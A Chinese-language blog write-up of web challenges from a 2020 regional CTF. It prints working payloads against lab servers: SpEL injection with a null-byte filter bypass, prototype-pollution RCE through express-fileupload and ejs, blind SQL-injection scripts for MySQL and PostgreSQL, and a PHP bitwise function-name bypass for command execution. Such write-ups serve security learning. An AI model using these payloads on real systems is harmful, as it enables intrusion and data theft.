<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>2020 CISCN 华东北赛区 WEB Writeup - rmb122's notebook</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="一共 6 题 WEB, 我一个人拿了 4 个一血, 还有一题全场 0 解. 然而没有 pwn 爷爷依旧被吊打, 而且题目质量是真的差, 明年再打国赛我是傻逼."><meta property="og:image" content><meta property="og:title" content="2020 CISCN 华东北赛区 WEB Writeup"><meta property="og:description" content="一共 6 题 WEB, 我一个人拿了 4 个一血, 还有一题全场 0 解. 然而没有 pwn 爷爷依旧被吊打, 而且题目质量是真的差, 明年再打国赛我是傻逼."><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2020/09/19/2020-CISCN-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-WEB-Writeup/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-09-19T22:14:55+00:00"><meta property="article:modified_time" content="2020-09-19T22:14:55+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="2020 CISCN 华东北赛区 WEB Writeup"><meta name=twitter:description content="一共 6 题 WEB, 我一个人拿了 4 个一血, 还有一题全场 0 解. 然而没有 pwn 爷爷依旧被吊打, 而且题目质量是真的差, 明年再打国赛我是傻逼."><script src=https://rmb122.com/js/feather.min.js></script>
<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.21410c161c7e5bcadc5a4eccf49ce5a024e0e8fc19babbd534cfe87972f5ee51.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
<a href=/posts>归档</a>&nbsp;
<a href=/tags>标签</a>&nbsp;
<a href=/links>友链</a>&nbsp;
<a href=/about>关于</a>
| <a id=dark-mode-toggle onclick=toggleTheme() href></a>
<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>2020 CISCN 华东北赛区 WEB Writeup</h1><div class=meta>发表于 2020 年 9 月 19 日</div></div><section class=body><p>一共 6 题 WEB, 我一个人拿了 4 个一血, 还有一题全场 0 解. 然而没有 pwn 爷爷依旧被吊打, 而且题目质量是真的差, 明年再打国赛我是傻逼.</p><h2 id=web3>web3</h2><p>http://172.20.29.103:80/flag.php 直接返回 flag. 你们赛宁没有题目复审的么?</p><h2 id=web4>web4</h2><p>随便 fuzz 根据报错得知是 sepl，构造 payload T%00 绕过过滤直接读文件即可, fix 的时候给看源码, 发现出题人正则写成了 <code>"T\\\\x00"</code>, 应该是想到了要过滤的, 你们赛宁没有题目复审的么? x2</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>POST / HTTP/1.1
</span></span><span style=display:flex><span>Host: 172.20.29.104:8080
</span></span><span style=display:flex><span>Content-Length: 91
</span></span><span style=display:flex><span>Cache-Control: max-age=0
</span></span><span style=display:flex><span>Origin: http://172.20.29.104:8080
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: 1
</span></span><span style=display:flex><span>DNT: 1
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span style=display:flex><span>Referer: http://172.20.29.104:8080/
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>expr=T%00(java.nio.file.Files).readAllLines(T%00(java.nio.file.Paths).get%00(&#39;/flag.txt&#39;)) 
</span></span></code></pre></div><h2 id=web7>web7</h2><p>扫出来只有 static 文件夹，根据 server header 得知服务器用的 nginx，同时存在配置错误，可以目录穿越读取文件.<br>http://172.20.29.107/static../app.js, 在源码中发现使用了 <code>express-fileupload</code> ，存在原型链污染，可以结合 ejs 利用，直接 rce</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>POST /4_pATh_y0u_CaNN07_Gu3ss HTTP/1.1
</span></span><span style=display:flex><span>Host: 172.20.29.107
</span></span><span style=display:flex><span>User-Agent: curl/7.64.1
</span></span><span style=display:flex><span>Accept: */*
</span></span><span style=display:flex><span>Content-Length: 263
</span></span><span style=display:flex><span>Content-Type: multipart/form-data; boundary=------------------------a4826c30ee705335
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>--------------------------a4826c30ee705335
</span></span><span style=display:flex><span>Content-Disposition: form-data; name=&#34;__proto__.outputFunctionName&#34;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;cat /flag.txt &gt; flag.txt&#39;);var __tmp2
</span></span><span style=display:flex><span>--------------------------a4826c30ee705335--
</span></span></code></pre></div><p>然后读取 http://172.20.29.107/static../flag.txt 即可</p><h2 id=web2>web2</h2><p>robots.txt 得到 hint.txt, 可以得到 sql 语句， 根据其特性，用 \ 来注入， 之后绕 waf 注入出密码，登陆后得到 c2ZtdHFs.php,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>import</span> requests
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> string
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sess <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>session()
</span></span><span style=display:flex><span>url <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;http://172.20.29.102/&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>flag <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;0x5e&#39;</span>
</span></span><span style=display:flex><span>table <span style=color:#ff79c6>=</span> string<span style=color:#ff79c6>.</span>ascii_letters <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39;_&#39;</span> <span style=color:#ff79c6>+</span> string<span style=color:#ff79c6>.</span>digits
</span></span><span style=display:flex><span>table <span style=color:#ff79c6>=</span> [<span style=color:#8be9fd;font-style:italic>ord</span>(i) <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> table]
</span></span><span style=display:flex><span>raw_flag <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> _ <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>100</span>):
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> table:
</span></span><span style=display:flex><span>        t <span style=color:#ff79c6>=</span> flag <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>hex</span>(i)[<span style=color:#bd93f9>2</span>:]<span style=color:#ff79c6>.</span>rjust(<span style=color:#bd93f9>0</span>, <span style=color:#f1fa8c>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#6272a4>#print(t)</span>
</span></span><span style=display:flex><span>        data <span style=color:#ff79c6>=</span> {
</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>&#39;username&#39;</span>: <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>&#39;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>&#39;password&#39;</span>: <span style=color:#f1fa8c>&#39;||password/**/regexp/**/binary/**/</span><span style=color:#f1fa8c>%s</span><span style=color:#f1fa8c>#&#39;</span> <span style=color:#ff79c6>%</span> t
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        res <span style=color:#ff79c6>=</span> sess<span style=color:#ff79c6>.</span>post(url, data)
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#39;success&#39;</span> <span style=color:#ff79c6>in</span> res<span style=color:#ff79c6>.</span>text:
</span></span><span style=display:flex><span>            <span style=color:#6272a4>#print(chr(i))</span>
</span></span><span style=display:flex><span>            flag <span style=color:#ff79c6>+=</span> <span style=color:#8be9fd;font-style:italic>hex</span>(i)[<span style=color:#bd93f9>2</span>:]<span style=color:#ff79c6>.</span>rjust(<span style=color:#bd93f9>0</span>, <span style=color:#f1fa8c>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>print</span>(flag)
</span></span><span style=display:flex><span>            raw_flag <span style=color:#ff79c6>+=</span> <span style=color:#8be9fd;font-style:italic>chr</span>(i)
</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>print</span>(raw_flag)
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>break</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> i <span style=color:#ff79c6>==</span> table[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>]:
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#39;WARNGIN&#39;</span>)
</span></span></code></pre></div><p>用 & 绕一下过滤，即可 rce</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>GET /c2ZtdHFs.php?gzmtu=(sysuem%26sysvem)((currenu%26currenv)((weucmmhecders%26oevennheeders)())) HTTP/1.1
</span></span><span style=display:flex><span>A: cat /flag.txt
</span></span><span style=display:flex><span>Host: 172.20.29.102
</span></span></code></pre></div><h2 id=web5>web5</h2><p>pgsql 注入，双写绕过 select，之后熟悉下语法写脚本注入后登陆就有 flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>import</span> requests
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> string
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sess <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>session()
</span></span><span style=display:flex><span>url <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;http://172.20.29.105/index.php&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>to_chr</span>(inp):
</span></span><span style=display:flex><span>    ret <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> inp:
</span></span><span style=display:flex><span>        ret <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;||chr(</span><span style=color:#f1fa8c>{</span><span style=color:#8be9fd;font-style:italic>ord</span>(i)<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>)&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> ret
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>table <span style=color:#ff79c6>=</span> string<span style=color:#ff79c6>.</span>ascii_letters <span style=color:#ff79c6>+</span> string<span style=color:#ff79c6>.</span>digits <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39;_.-&#39;</span>
</span></span><span style=display:flex><span>flag <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span>
</span></span><span style=display:flex><span>table <span style=color:#ff79c6>=</span> string<span style=color:#ff79c6>.</span>printable
</span></span><span style=display:flex><span>table <span style=color:#ff79c6>=</span> [<span style=color:#8be9fd;font-style:italic>ord</span>(i) <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> table]
</span></span><span style=display:flex><span>query <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;selselectect/**/password/**/from/**/users/**/limit/**/1/**/OFFSET/**/0&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> _ <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>100</span>):
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> table:
</span></span><span style=display:flex><span>        t <span style=color:#ff79c6>=</span> to_chr(flag) <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#39;||chr(</span><span style=color:#f1fa8c>{</span>i<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>)&#39;</span>
</span></span><span style=display:flex><span>        t <span style=color:#ff79c6>=</span> t[<span style=color:#bd93f9>2</span>:]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        data <span style=color:#ff79c6>=</span> {
</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>&#39;username&#39;</span>: <span style=color:#f1fa8c>&#39;admin&#39;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>&#39;password&#39;</span>: <span style=color:#f1fa8c>&#34;admin&#39;/**/or/**/&#39;1&#39;/**/and/**/cast(position(</span><span style=color:#f1fa8c>%s</span><span style=color:#f1fa8c>/**/in/**/(</span><span style=color:#f1fa8c>%s</span><span style=color:#f1fa8c>))/**/as/**/bool)/**/and/**/&#39;1&#34;</span> <span style=color:#ff79c6>%</span> (t, query)
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        res <span style=color:#ff79c6>=</span> sess<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>&#39;http://172.20.29.105/index.php&#39;</span>, data<span style=color:#ff79c6>=</span>data)
</span></span><span style=display:flex><span>        <span style=color:#6272a4>#print(res.text)</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#39;hacker&#39;</span> <span style=color:#ff79c6>in</span> res<span style=color:#ff79c6>.</span>text:
</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#39;hacker&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#39;Too Young Too Simple&#39;</span> <span style=color:#ff79c6>in</span> res<span style=color:#ff79c6>.</span>text:
</span></span><span style=display:flex><span>            flag <span style=color:#ff79c6>+=</span> <span style=color:#8be9fd;font-style:italic>chr</span>(i)
</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>print</span>(flag)
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>break</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> i <span style=color:#ff79c6>==</span> table[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>]:
</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#39;WARNNING&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>for</span> _ <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>100</span>):
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> table:
</span></span><span style=display:flex><span>                    t <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#39;||chr(</span><span style=color:#f1fa8c>{</span>i<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>)&#39;</span> <span style=color:#ff79c6>+</span> to_chr(flag)
</span></span><span style=display:flex><span>                    t <span style=color:#ff79c6>=</span> t[<span style=color:#bd93f9>2</span>:]
</span></span><span style=display:flex><span>                    data <span style=color:#ff79c6>=</span> {
</span></span><span style=display:flex><span>                        <span style=color:#f1fa8c>&#39;username&#39;</span>: <span style=color:#f1fa8c>&#39;admin&#39;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#f1fa8c>&#39;password&#39;</span>: <span style=color:#f1fa8c>&#34;admin&#39;/**/or/**/&#39;1&#39;/**/and/**/cast(position(</span><span style=color:#f1fa8c>%s</span><span style=color:#f1fa8c>/**/in/**/(</span><span style=color:#f1fa8c>%s</span><span style=color:#f1fa8c>))/**/as/**/bool)/**/and/**/&#39;1&#34;</span> <span style=color:#ff79c6>%</span> (
</span></span><span style=display:flex><span>                        t, query)
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    res <span style=color:#ff79c6>=</span> sess<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>&#39;http://172.20.29.105/index.php&#39;</span>, data<span style=color:#ff79c6>=</span>data)
</span></span><span style=display:flex><span>                    <span style=color:#6272a4># print(res.text)</span>
</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#39;hacker&#39;</span> <span style=color:#ff79c6>in</span> res<span style=color:#ff79c6>.</span>text:
</span></span><span style=display:flex><span>                        <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#39;hacker&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#39;Too Young Too Simple&#39;</span> <span style=color:#ff79c6>in</span> res<span style=color:#ff79c6>.</span>text:
</span></span><span style=display:flex><span>                        flag <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>chr</span>(i) <span style=color:#ff79c6>+</span> flag
</span></span><span style=display:flex><span>                        <span style=color:#8be9fd;font-style:italic>print</span>(flag)
</span></span><span style=display:flex><span>                        <span style=color:#ff79c6>break</span>
</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>if</span> i <span style=color:#ff79c6>==</span> table[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>]:
</span></span><span style=display:flex><span>                        <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#39;WARNNING&#39;</span>)
</span></span></code></pre></div><h2 id=web6>web6</h2><p>这题目能把人气笑, 全场 0 解, 最后发现放了个 ssrf.php, 无任何提示, 就硬猜, 而且里面的过滤写成了 <code>/file:|http://|php/</code>, 这是过滤了个锤子, 你们赛宁没有题目复审的么? x3</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/web>web</a></li><li><a href=/tags/ctf>ctf</a></li></ul></nav></div></article></main><footer><div class=footer-info>2022 @rmb122</div><div style=display:flex><a class=border></a><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a></div></footer><script>feather.replace()</script></div></body></html>